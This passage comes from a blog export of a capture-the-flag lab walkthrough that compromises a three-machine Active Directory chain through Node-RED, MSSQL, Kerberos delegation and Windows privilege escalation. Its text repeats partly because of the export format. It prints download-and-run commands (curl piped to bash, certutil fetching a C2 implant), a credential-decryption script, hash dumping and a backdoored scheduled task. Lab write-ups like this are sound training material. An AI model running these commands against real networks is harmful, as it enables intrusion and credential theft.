&#x27;.[&quot;$&quot;]&#x27; $1flows_cred.json | cut -c 1-32` -K `jq -j &#x27;._credentialSecret&#x27; $1.config.runtime.json | sha256sum | cut -c 1-64`</span><br></pre></td></tr></table></figure>\n\n<p>This leaves us with the following response after decrypting the hash.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ./dec_flow_creds.sh       </span><br><span class=\"line\">&#123;&quot;d237b4c16a396b9e&quot;:&#123;&quot;username&quot;:&quot;nodered_connector&quot;,&quot;password&quot;:&quot;[...snip...]&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>We have found creds for a user, however you’ll notice that this does not seem to belong to a user on the host machine. The only other user that we are able to authenticate to is <code>labadmin</code>, who probably has the user flag within their home folder.</p>\n<h1 id=\"Enabling-MSSQL-Database-Connection-on-NODERED\"><a href=\"#Enabling-MSSQL-Database-Connection-on-NODERED\" class=\"headerlink\" title=\"Enabling MSSQL Database Connection on NODERED$\"></a>Enabling MSSQL Database Connection on NODERED$</h1><p>I checked for credential reusage for any of the users through SSH or RDP on the other machines, however came back with no results. Given the name of the user <code>nodered_connector</code>, we can guess that these creds still belong to the Node-RED service.</p>\n<p>If we remember originally from the start of the box, there was an MSSQL node that was failing from one of the flow diagrams in Node-RED. If we take a look back at this, we can edit the SQL node information and we’ll find the same <code>nodered_connector</code> auto-filled into the credential option for this node. Entering our creds into this will cause the node error to disappear after deploying the diagram.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/g.jpg\"></p>\n<p>From here, we can determine whether or not we can access the MSSQL database by setting up a SOCKS proxy on the <code>.183</code> machine we have access to. Sliver has a built-in SOCKS5 proxy functionality, so we’ll use that alongside <code>proxychains</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (tengu) &gt; socks5 start</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started SOCKS5 127.0.0.1 1081</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then need to change our <code>/etc/proxychains4.conf</code> file to reflect this SOCKS proxy and connect to it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[ProxyList]</span><br><span class=\"line\"># add proxy here ...</span><br><span class=\"line\"># meanwile</span><br><span class=\"line\"># defaults set to &quot;tor&quot;</span><br><span class=\"line\">socks5  127.0.0.1 1081</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have access via the proxy, we can attempt to find the MSSQL service on <code>sql.tengu.vl</code> by trying to NMAP to all of the machines for it.</p>\n<ul>\n<li><code>proxychains4 nmap 10.10.187.183 -p1433 &amp;&amp; proxychains4 nmap 10.10.187.182 -p1433 &amp;&amp; proxychains4 nmap 10.10.187.183 -p1433</code></li>\n</ul>\n<p>We’ll see that we receive a hit on <code>10.10.187.182</code>. This means we should be able to authenticate to MSSQL on <code>.182</code> with the <code>nodered_connector</code> creds that we have. We’ll do so with Impacket.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-mssqlclient -dc-ip 10.10.187.181 -target-ip 10.10.187.182 TENGU/&#x27;nodered_connector&#x27;:&#x27;[...snip...]&#x27;@10.10.187.182</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/tengu-vl/h.jpg\"></p>\n<h1 id=\"MSSQL-Database-Enumeration\"><a href=\"#MSSQL-Database-Enumeration\" class=\"headerlink\" title=\"MSSQL Database Enumeration\"></a>MSSQL Database Enumeration</h1><p>Now that we have access to the MSSQL service, we can look around each database to find any credentials for any other users. This <a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server\">HackTricks article</a> helped with utilizing a few MSSQL queries.</p>\n<p>In the <code>Demo</code> database, there is a user hash for <code>t2_m.winters</code>. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (nodered_connector  nodered_connector@Demo)&gt; SELECT * FROM Users;</span><br><span class=\"line\">  ID   Username          Password                                                              </span><br><span class=\"line\">----   ---------------   -------------------------------------------------------------------   </span><br><span class=\"line\">NULL   b&#x27;t2_m.winters&#x27;   b&#x27;[...snip...]&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>I couldn’t find any success in using <code>JTR</code> or <code>Hashcat</code> with this hash, however I used the hash cracker on this <a href=\"https://hashes.com/en/tools/hash_identifier\">website</a> and found the respective credentials for this user.</p>\n<p>If you’ll notice in the <code>/home/tengu.vl</code> directory on the Linux machine, the user has a home folder within this directory. Even though this user is not within the <code>/etc/passwd</code> file (which would normally indicate to us that they are not an actual user on this system), we can still login as them using <code>su t2_m.winters</code> within the Linux machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nodered_svc@nodered:/tmp$ su t2_m.winters@tengu.vl</span><br><span class=\"line\">Password: </span><br><span class=\"line\">t2_m.winters@tengu.vl@nodered:/tmp$</span><br></pre></td></tr></table></figure>\n\n<p>After logging in, we can see that we have permissions to run everything as root with <code>sudo -l</code> and <code>t2_m.winters</code> password. This means we can gain root access with <code>sudo su</code> and locate the first flag within <code>/root/root.txt</code>.</p>\n<h1 id=\"Pivoting-to-SQL\"><a href=\"#Pivoting-to-SQL\" class=\"headerlink\" title=\"Pivoting to SQL$\"></a>Pivoting to SQL$</h1><p>Just for some due diligence that I learned when doing the Hybrid chain a while back, I extracted <code>/etc/krb5.keytab</code> to my local machine and decrypted it using <a href=\"https://github.com/sosdave/KeyTabExtract\">KeyTabExtract</a>. This will give us the NTLM hash of the <code>NODERED$</code> machine account.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.</span><br><span class=\"line\">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.</span><br><span class=\"line\">[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.</span><br><span class=\"line\">[+] Keytab File successfully imported.</span><br><span class=\"line\">        REALM : TENGU.VL</span><br><span class=\"line\">        SERVICE PRINCIPAL : NODERED$/</span><br><span class=\"line\">        NTLM HASH : [...snip...]</span><br><span class=\"line\">        AES-256 HASH : [...snip...]</span><br><span class=\"line\">        AES-128 HASH : [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Whether or not we’ll need this is really up to the box. That being said, you’ll notice on the Wiki that it’s telling us to utilize delegation for our next vector. Originally I thought we’d do this to access <code>.182</code>, however it seems that machine was only used for the <code>MSSQL</code> purpose that we needed it for before, as it doesn’t seem to have anything else useful for us right now.</p>\n<p>Running <code>crackmapexec</code> through our DC seems to let us know that we have valid credentials to LDAP on the DC with <code>t2_m.winters</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 crackmapexec ldap 10.10.187.181 -u &#x27;t2_m.winters&#x27; -p &#x27;[...snip...]&#x27;                                              </span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:389  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:135  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.187.181:445  ...  OK</span><br><span class=\"line\">SMB         10.10.187.181   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  DC.tengu.vl:389  ...  OK</span><br><span class=\"line\">LDAP        10.10.187.181   389    DC               [+] tengu.vl\\t2_m.winters:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Note that I did take a break here for the day, so the IP addresses will change. The new chain addresses will vary.</p>\n<p>Now that we have valid credentials to LDAP as a user, we can dump the domain using <a href=\"https://github.com/dirkjanm/BloodHound.py\">Bloodhound</a>.</p>\n<p>In the Bloodhound GUI, I couldn’t find anything out of the ordinary for the <code>t2_m.winters</code>. They are a valid user to the LDAP service on the DC, but they don’t seem to have anything else. Let’s take a look at the machine account <code>NODERED$</code> that we currently have an NTLM hash for.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/i.jpg\"></p>\n<h1 id=\"ReadGMSAPassword-on-GMSA01\"><a href=\"#ReadGMSAPassword-on-GMSA01\" class=\"headerlink\" title=\"ReadGMSAPassword on GMSA01$\"></a>ReadGMSAPassword on GMSA01$</h1><p>It seems that our machine account <code>NODE-RED$</code> is a part of the <code>LINUX_SERVER</code> domain group, which has <code>ReadGMSAPassword</code> over <code>GMSA01$@tengu.vl</code>. This essentially means that we can read the respective password for this user as our <code>NODERED$</code> machine account. We can do so with crackmapexec.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 crackmapexec ldap dc.tengu.vl -u &#x27;NODERED$&#x27; -H [...snip...] --gmsa</span><br><span class=\"line\"></span><br><span class=\"line\">SMB         dc.tengu.vl     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  DC.tengu.vl:636  ...  OK</span><br><span class=\"line\">LDAP        dc.tengu.vl     636    DC               [+] tengu.vl\\NODERED$:[...snip...] </span><br><span class=\"line\">LDAP        dc.tengu.vl     636    DC               [*] Getting GMSA Passwords</span><br><span class=\"line\">LDAP        dc.tengu.vl     636    DC               Account: gMSA01$              NTLM: [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have credentials to this user, we can check what we can access to as this user in Bloodhound.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/j.jpg\"></p>\n<p>Our user <code>GMSA01$</code>, has constrained delegation rights on the SQL machine, <code>sql.tengu.vl</code>. This means that we are allowed to authenticate as any user to specific services (more than likely MSSQL in our case) onto this machine. We can also impersonate domain admins, meaning that we can potentially compromise this entire host just from this privilege.</p>\n<p>The victim in our case will be the SPN <code>MSSQLSvc/sql.tengu.vl</code> and will request a TGT for that SPN before using S4U2Self&#x2F;S4U2Proxy to impersonate the user we are requesting for.</p>\n<p>Note that we won’t be able to impersonate the Administrator as we only have an SPN for MSSQLSvc. You can verify the SPN by running LDAPSearch to query the domain with <code>t2_m.winters</code> credentials..</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 ldapsearch -LLL -x -H &#x27;ldap://10.10.138.229&#x27; -D &#x27;t2_m.winters@tengu.v&#x27; -w &#x27;Tengu123&#x27; -b &quot;dc=tengu,dc=vl&quot; &quot;(&amp;(objectClass=User)(msDS-AllowedToDelegateTo=*))&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">[...snip...]</span><br><span class=\"line\">servicePrincipalName: MSSQLSvc/SQL.tengu.vl:1433</span><br><span class=\"line\">servicePrincipalName: MSSQLSvc/SQL.tengu.vl</span><br><span class=\"line\">objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configurat</span><br><span class=\"line\"> ion,DC=tengu,DC=vl</span><br><span class=\"line\"> [...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>So we’ll need to find another user we can impersonate. If we had an SPN for CIFS, then we might be able to impersonate Administrator. That being said, if we look at the available users on <code>sql.tengu.vl</code>, we can try to find a few to impersonate.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/k.jpg\"></p>\n<p>You’ll notice that there is a DA on this machine, though using <code>impacket-getST</code> does not let me impersonate them. this is due to them being within the <code>Protected Users</code> group, meaning we can not request a MSSQL service ticket as them.</p>\n<p>If you didn’t notice, there is an SQL Admins group that appear in the search bar. Investigating into this group gives me the impression that <code>t1_m.winters</code> is a valid user we can potentially try.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-getST -spn &#x27;MSSQLSvc/sql.tengu.vl&#x27; &#x27;tengu.vl/GMSA01$@sql.tengu.vl&#x27; -hashes :[...snip...] -dc-ip 10.10.138.229 -impersonate &#x27;t1_m.winters&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ export KRB5CCNAME=t1_m.winters@MSSQLSvc_sql.tengu.vl@TENGU.VL.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ proxychains4 impacket-mssqlclient -k sql.tengu.vl</span><br><span class=\"line\">SQL (TENGU\\t1_m.winters  dbo@master)&gt;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SQL-MSSQL-XP-Cmdshell\"><a href=\"#SQL-MSSQL-XP-Cmdshell\" class=\"headerlink\" title=\"SQL$ MSSQL XP Cmdshell\"></a>SQL$ MSSQL XP Cmdshell</h1><p>We are able to successfully authenticate as this user into the MSSQL service and can now enumerate a little further into what we can achieve. It seems that we have the ability to run commands if we use <code>enable_xp_cmdshell</code> and <code>xp_cmdshell</code>, which means we now have code execution on the second machine.</p>\n<p>I also tested for AMSI with <code>xp_cmdshell &quot;powershell -e SW52b2tlLU1pbWlrYXR6&quot;</code>, it seems that AV is not enabled on this machine. In that case we can try to curl our Sliver payload to this machine and execute it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (TENGU\\t1_m.winters  dbo@master)&gt; xp_cmdshell powershell &quot;cd ..\\..; mkdir temp; cd C:\\temp; certutil.exe -urlcache -f http://10.8.0.173:9001/sql_tengu.exe sql_tengu.exe; .\\sql_tengu.exe&quot;</span><br></pre></td></tr></table></figure>\n\n<p>We should now have proper code execution as the <code>gMSA01$</code> user, as denoted below.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/l.jpg\"></p>\n<h1 id=\"Impersonating-SYSTEM-with-SharpEfsPotato\"><a href=\"#Impersonating-SYSTEM-with-SharpEfsPotato\" class=\"headerlink\" title=\"Impersonating SYSTEM with SharpEfsPotato\"></a>Impersonating SYSTEM with SharpEfsPotato</h1><p>If you’ll notice, this user has <code>SeImpersonatePrivilege</code>, meaning we can impersonate SYSTEM and spawn a named pipe onto PowerShell, which we can then run our <code>sql_tengu</code> binary again to get a session as SYSTEM. We’ll use <a href=\"https://github.com/bugch3ck/SharpEfsPotato\">SharpEfsPotato</a> for this and can get a SYSTEM shell relatively easily. Note that I tried doing this through Sliver’s UI, and was running into a token error. I dropped it locally to <code>sql.tengu.vl</code> and it seemed to work as intended.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; .\\SharpEfsPotato.exe -p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a &quot;cd C:\\temp; .\\sql_tengu.exe&quot; </span><br><span class=\"line\"></span><br><span class=\"line\">SharpEfsPotato by @bugch3ck</span><br><span class=\"line\">  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.</span><br><span class=\"line\"></span><br><span class=\"line\">  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/b9f1bb62-6bd4-4aa0-90d1-cca939fb5983/\\b9f1bb62-6bd4-4aa0-90d1-cca939fb5983\\b9f1bb62-6bd4-4aa0-90d1-cca939fb5983</span><br><span class=\"line\">df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:</span><br><span class=\"line\">[x]RpcBindingSetAuthInfo failed with status 0x6d3</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br><span class=\"line\">[*] Session 2debc8b7 sql_tengu - 10.10.138.230:49693 (SQL) - windows/amd64 - Tue, 28 May 2024 14:34:18 EDT</span><br></pre></td></tr></table></figure>\n\n<p>We can now view the second flag which is within <code>C:\\Users\\Administrator\\Desktop</code>.</p>\n<h1 id=\"Pivoting-to-the-DC\"><a href=\"#Pivoting-to-the-DC\" class=\"headerlink\" title=\"Pivoting to the DC\"></a>Pivoting to the DC</h1><p>Now that we have a SYSTEM shell on this machine, we can essentially dump all credentials on this machine with <a href=\"https://github.com/ParrotSec/mimikatz\">Mimikatz</a>. Before we do this though, I went to verify if there were any users that we could potentially look at to pivot to the DC.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/m.jpg\"></p>\n<p>It seems that <code>T0_C.FOWLER</code> can do this, who is also a part of the <code>T0_Admins</code> domain group. If we are able to get their credentials, we may be able to authenticate to the DC and go from there. I also reset my SOCKS5 proxy to the SYSTEM session that we have right now just for due diligence, it shouldn’t really matter that much as far as I’m concerned.</p>\n<h1 id=\"Scheduled-Task-Exploitation\"><a href=\"#Scheduled-Task-Exploitation\" class=\"headerlink\" title=\"Scheduled Task Exploitation\"></a>Scheduled Task Exploitation</h1><p>Doing some enumeration, I couldn’t find much with PowerView. I then moved onto scheduled tasks, which showed some promise. Enumerating scheduled tasks can be done with the following: <code>schtasks /query /v /fo LIST &gt; tasklist.txt</code> </p>\n<p><img src=\"/images/vulnlab/tengu-vl/n.jpg\"></p>\n<p>There’s a task file denoted as <code>C:\\admin\\Task.ps1</code> that seems to be ran as <code>t0_c.fowler</code>, which is the user we are trying to escalate as. If we plant a reverse shell or attempt to execute our Sliver binary, we should be able to get a session as this user once this task is executed. (I just added <code>Start-Process &quot;C:\\temp\\sql_tengu.exe&quot;</code> to the bottom of the file.)</p>\n<p>You’ll notice though that this task is being ran once every day. We’ll need to speed this up. We can do so by forcing Task Scheduler to restart the task, by executing: <code>Get-ScheduledTask -TaskName &quot;Daily_Checkup&quot; | Start-ScheduledTask</code></p>\n<p>After waiting about a minute, we should get a new session as <code>c.fowler</code>.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/o.jpg\"></p>\n<p>Now that we are a DA and that we verified that we are a DA within the DC, we can view the contents of the Administrator’s directory on the DC through CIFS.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; cat \\\\dc.tengu.vl\\C$\\Users\\Administrator\\Desktop\\root.txt</span><br><span class=\"line\">VL&#123;...snip...&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This means we have successfully rooted this machine! Big thanks to r0BIT for the development of this chain, it helped me strengthen a lot of the AD privilege escalation core fundamentals that I had learned about previously.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/p.jpg\"></p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://nodered.org/#:~:text=Node%2DRED%20is%20a%20programming,runtime%20in%20a%20single%2Dclick\">https://nodered.org/#:~:text=Node%2DRED%20is%20a%20programming,runtime%20in%20a%20single%2Dclick</a>.<br><a href=\"https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/\">https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/</a><br><a href=\"https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/\">https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13\">https://rootsecdev.medium.com/hacking-active-directory-with-sliver-c2-19d7ceabbf13</a><br><a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server\">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</a><br><a href=\"https://hashes.com/en/tools/hash_identifier\">https://hashes.com/en/tools/hash_identifier</a><br><a href=\"https://github.com/sosdave/KeyTabExtract\">https://github.com/sosdave/KeyTabExtract</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://github.com/bugch3ck/SharpEfsPotato\">https://github.com/bugch3ck/SharpEfsPotato</a><br><a href=\"https://github.com/ParrotSec/mimikatz\">https://github.com/ParrotSec/mimikatz</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This was my first step into a three-machine chain on VulnLab, and I want to thank r0BIT on the development of this chain and all of the work that was developed for this chain. It involves exploiting a domain-joined Linux machine and pivoting through MSSQL, finally leading to the DC after.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Upon doing our first scans, we can see that there are three machines that collectively have either RDP or SSH on them. There’s also another port on <code>.183</code> denoted as <code>VSAT-CONTROL</code> on port 1880, though this seems to be the only other port that is available.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:01 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.187.181</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 999 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 22.28 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:01 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.187.182</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 999 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 22.45 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-27 22:02 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.187.183</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 999 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">1880/tcp open  vsat-control</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 15.46 seconds</span><br></pre></td></tr></table></figure>\n\n<p>Usually these chains start with the machine that has the highest number in the IP address, being <code>.183</code> in our case. We’ll try to look into these a little more to see if there are any other services. We can start by examining the <code>vsat-control</code> service, as I’ve found that it’s being hosted on a front-end web application.</p>\n<h1 id=\"Node-RED-RCE\"><a href=\"#Node-RED-RCE\" class=\"headerlink\" title=\"Node-RED RCE\"></a>Node-RED RCE</h1><p>Upon accessing the website, we can see that we are greeted with the <code>Node-RED</code> service.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/b.jpg\"></p>\n<p>This seems to be interconnected with an <code>MSSQL</code> service, however I’m assuming that the databases are only accessible on the back-end, since we did not see them on our initial scan.</p>\n<p>Node-RED seems to be a programming tool for wiring APIs and devices together through a centralized service. The interface that we are currently interacting with is a flow diagram to which maps out different services in a stream-lined fashion. This specific web application seems to utilize JavaScript functions within the flow diagram editor for easier template and function usage. The most up-to-date version of Node-RED seems to be v3.1.9, however you’ll notice from the menu that we’re currently on v3.1.6.</p>\n<p>A good way to think about this is that you can map the connections between devices and how they’re used. It’s essentially like drawing diagrams in Paint or Microsoft Visio, except those figures that you use are services and web-apps. The application itself is publicly accessible since it does not enforce any form of authentication into the web service.</p>\n<p>In the flow diagram that we have access to, there are four different figures for us to look at; <code>timestamp</code>, <code>SQL</code>, <code>Pull_Data</code>, and <code>/tmp/output</code>. We also see underneath the <code>SQL</code> node that there seems to be a connection error between this web service and <code>sql.tengu.vl:1433</code>, which my guess is the domain name of one of the machines. I’ve done some research and found that MSSQL can run on Linux (which is the OS of the machine we’re on), though most don’t recommend it in a production environment.</p>\n<p>I found some resources about this specific service and how to exploit it, notably by <code>qkaiser</code> in <a href=\"https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/\">this article</a>. This involves utilizing the <code>exec</code> node to trigger arbitrary command execution through the debug console.</p>\n<p>To test this functionality, I spun up a simple Python server on my localhost with <code>http://(IP):9001/</code> and created a node flow that executed an arbitrary command via the <code>exec</code> and <code>debug</code> nodes. To test this, I just had the <code>exec</code>  node make a request with <code>curl</code> towards our Python server.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/c.jpg\"></p>\n<p>Upon saving our changes and deploying the flow diagram, we’ll run our nodes to execute the command, which we can see runs successfully in based on the captured request.</p>\n<p><img src=\"/images/vulnlab/tengu-vl/d.jpg\"></p>\n<p>Now that we verified that we have remote code execution, we can attempt to execute a payload. <code>qkaiser</code> developed a proof-of-concept that we can utilize to get remote code execution, which you can find in the article I have referenced above.</p>\n<p>The proof-of-concept itself seems to be explained thoroughly, as it essentially checks if there are any authentication requirements such as using credentials or requiring a token to the service to run. If those checks are passed, it will perform the following:</p>\n<ul>\n<li>Create a timestamp node and attach an exec block to it.</li>\n<li>Listen for any requests through a web socket</li>\n<li>Execute the exec block and catch the web socket request after it is triggered.</li>\n<li>Provide a terminal UI that allows us to interact with the reverse shell when it is generated.</li>\n</ul>\n<p>The only requirement we need to provide the proof-of-concept with is the URL to the web service (since there is no authentication required on our behalf).</p>\n<p><img src=\"/images/vulnlab/tengu-vl/e.jpg\"></p>\n<p>The socket that opens up for us seems to have some odd behavior, so I decided to set up a simple reverse shell and use <code>curl http:(IP):(PORT)/rev.sh | bash</code> to this machine to execute (I used <a href=\"https://www.revshells.com/\">revshells</a> for <code>rev.sh</code> which just as a bash one-liner). You can do what you’d like, however this seemed to work for me - which afterwards I stood up a <a href=\"https://github.com/BishopFox/sliver\">Sliver</a> server and executed an implant which would provide me with a Sliver session on the remote host.</p>\n<p>(Note that the file named <code>tengu</code> is my sliver implant)</p>\n<h1 id=\"NODERED-Host-Reconnaissance\"><a href=\"#NODERED-Host-Reconnaissance\" class=\"headerlink\" title=\"NODERED$ Host Reconnaissance\"></a>NODERED$ Host Reconnaissance</h1><p><img src=\"/images/vulnlab/tengu-vl/f.jpg\"></p>\n<p>So this user seems to have their own home directory, however I noticed that there is no user flag in their home folder. This means we’ll need to escalate our privileges to the next user in order to do this.</p>\n<p>I immediately started to look into the <code>.node-red</code> directory, as it seems to be the only unusual file in the users home folder. This directory housed a file that we can use to potentially escalate privileges - <code>flows_cred.json</code>.</p>\n<h1 id=\"Decrypting-Flow-Creds\"><a href=\"#Decrypting-Flow-Creds\" class=\"headerlink\" title=\"Decrypting Flow Creds\"></a>Decrypting Flow Creds</h1><p>There is a hash in <code>flows_cred.json</code> that is unrecognized by tools like <code>hashcat</code> and <code>JTR</code>, so we’ll need to decrypt them in some way. Doing some research into this file led me to discover that there is a key for this hash located within <code>.config.runtime.json</code> (I used <a href=\"https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/\">this article</a> as reference for how to decrypt it). Essentially the key within the config file is hashed with SHA256 and is passed into the <code>decryptCredentials()</code> function, to which the key is then used to alter the first 32 characters of the hash.</p>\n<p>The proof-of-concept provided in the article decrypts the hash using <code>openssl</code> and reconverts the first 32 characters that have been altered by the respective function. I did some altering to the proof-of-concept that it provided, and ran it locally as the <code>jq</code> dependency was not available on the remote host. (All credit for the below code goes to HugoPoi in their article and for the development of the code.)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat dec_flow_creds.sh      </span><br><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">#</span><br><span class=\"line\"># Decrypt flows_cred.json from a NodeRED data directory</span><br><span class=\"line\">#</span><br><span class=\"line\"># Usage</span><br><span class=\"line\"># ./node-red-decrypt-flows-cred.sh ./node_red_data</span><br><span class=\"line\">#</span><br><span class=\"line\">jq  &#x27;.[&quot;$&quot;]&#x27; -j $1flows_cred.json | \\</span><br><span class=\"line\">  cut -c 33- | \\</span><br><span class=\"line\">  openssl enc -aes-256-ctr -d -base64 -A -iv `jq  -r &#x27;.[&quot;$&quot;]&#x27; $1flows_cred.json | cut -c 1-32` -K `jq -j &#x27;._credentialSecret&#x27; $1.config.runtime.json | sha256sum | cut -c 1-64`</span><br></pre></td></tr></table></figure>\n\n<p>This leaves us with the following response after decrypting the hash.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ./dec_flow_creds.sh       </span><br><span class=\"line\">&#123;&quot;d237b4c16a396b9e&quot;:&#123;&quot;username&quot;:&quot;nodered_connector&quot;,&quot;password&quot;:&quot;[...snip...]&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>We have found creds for a user, however you’ll notice that this does not seem to belong to a user on the host machine. The only other user that we are able to authenticate to is <code>labadmin</code>, who probably has the user flag within their 